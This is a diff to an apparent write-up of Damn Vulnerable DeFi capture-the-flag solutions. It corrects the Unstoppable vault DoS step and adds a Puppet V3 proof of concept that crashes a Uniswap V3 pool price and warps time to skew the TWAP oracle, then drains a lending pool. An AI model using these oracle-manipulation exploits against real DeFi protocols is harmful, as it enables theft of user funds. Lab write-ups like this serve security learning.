@@ -8,7 +8,7 @@ by tinamints
 -  flashloan
 -  DOS
 ### solution : 
-- send token via 'deposit' function to make `if (convertToShares(totalSupply) != balanceBefore) revert InvalidBalance();` true because totalSupply' only changes when someone send token via 'deposit function
+- send token via 'transfer' function to make `if (convertToShares(totalSupply) != balanceBefore) revert InvalidBalance();` true because ERC4626 'totalSupply' only changes when someone send token via 'deposit function 
 ### POC
 ` function test_unstoppable() public checkSolvedByPlayer {
         token.transfer(address(vault), 1);
@@ -381,5 +381,42 @@ by tinamints
     }
 `
 
+## 14. Puppet V3
+### conditions :
+- drain all 1M DVT from the lending pool to recovery
+- complete within the challenge's time limit (under 115 seconds after setup)
+### concepts :
+-  Uniswap V3 TWAP oracle price manipulation
+-  time-weighted average price (delaying the manipulation with `vm.warp`)
+### solution :
+- dump the player's 110 DVT into the Uniswap V3 pool via `exactInputSingle` to crash the token price, then `vm.warp` forward as close to the time limit as possible so the TWAP shifts toward the crashed price, making `calculateDepositOfWETHRequired` cheap enough to borrow all 1M DVT with minimal WETH collateral
+### POC
+` function test_puppetV3() public checkSolvedByPlayer {
+        address uniswapRouterAddress = 0xE592427A0AEce92De3Edee1F18E0157C05861564;
+        token.approve(address(uniswapRouterAddress), type(uint256).max);
+        uint256 quote1 = lendingPool.calculateDepositOfWETHRequired(LENDING_POOL_INITIAL_TOKEN_BALANCE);
+        console.log("quote1: ", quote1);
+ 
+        ISwapRouter(uniswapRouterAddress).exactInputSingle(
+            ISwapRouter.ExactInputSingleParams(
+                address(token),
+                address(weth),
+                3000,
+                address(player),
+                block.timestamp,
+                PLAYER_INITIAL_TOKEN_BALANCE,
+                0,
+                0
+            )
+        );  
+         vm.warp(block.timestamp + 114);
+        uint256 quote = lendingPool.calculateDepositOfWETHRequired(LENDING_POOL_INITIAL_TOKEN_BALANCE);
+        weth.approve(address(lendingPool), quote);
+        console.log("quote: ", quote);
+        lendingPool.borrow(LENDING_POOL_INITIAL_TOKEN_BALANCE);
+        token.transfer(recovery,LENDING_POOL_INITIAL_TOKEN_BALANCE);
+        
+    }
+`
 
 
